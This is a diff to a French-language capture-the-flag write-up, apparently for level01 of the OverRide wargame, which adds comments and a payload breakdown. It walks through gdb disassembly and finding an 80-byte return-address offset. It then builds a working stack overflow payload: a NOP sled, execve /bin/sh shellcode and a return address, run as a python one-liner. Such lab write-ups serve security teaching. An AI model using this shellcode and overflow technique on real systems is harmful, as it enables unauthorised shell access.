@@ -33,7 +33,7 @@ Dump of assembler code for function main:
    0x08048510 <+64>:    mov    0x804a020,%eax
    0x08048515 <+69>:    mov    %eax,0x8(%esp)
    0x08048519 <+73>:    movl   $0x100,0x4(%esp)
-   0x08048521 <+81>:    movl   $0x804a040,(%esp) <=== adresse du 1er buffer sur la pile.
+   0x08048521 <+81>:    movl   $0x804a040,(%esp) <=============== adresse du 1er buffer sur la pile.
    0x08048528 <+88>:    call   0x8048370 <fgets@plt>
    0x0804852d <+93>:    call   0x8048464 <verify_user_name>
    0x08048532 <+98>:    mov    %eax,0x5c(%esp)
@@ -47,7 +47,7 @@ Afin de trouver l'offset pour le ecrasement du pointeur de retour, j'utilise un 
 (gdb) run
 Starting program: /home/users/level01/level01
 ********* ADMIN LOGIN PROMPT *********
-Enter Username: dat_wil
+Enter Username: dat_wil       <================================== on entre le username pour passer au deuxieme prompt
 verifying username....
 
 Enter Password:
@@ -63,10 +63,17 @@ Program received signal SIGSEGV, Segmentation fault.
 
 Donc l'offset est de 84 - 4.
 
-L'adresse de redirection sera : "\x60\xa0\x04\x08" pour sauter dans le nopsled.
+L'adresse de redirection sera : "\x60\xa0\x04\x08" pour sauter dans le nopsled (0x804a040 + 20).
 
 Nous pouvons creer notre payload.
-
+```
+"dat_wil" ==> username
+ + "\x90" * 30 ==> NopSled
+  + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" ==> shellcode
+   + "\n" ==> soumission du 1er prompt
+    + "A" * 80 ==> offset
+     + "\x60\xa0\x04\x08" ==> addresse vers jump
+```
 ```
 level01@OverRide:~$ python -c 'print("dat_wil" + "\x90" * 30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\n" + "A" * 80 + "\x60\xa0\x04\x08")' > /tmp/payload.txt
 level01@OverRide:~$ cat /tmp/payload.txt - | /home/users/level01/level01
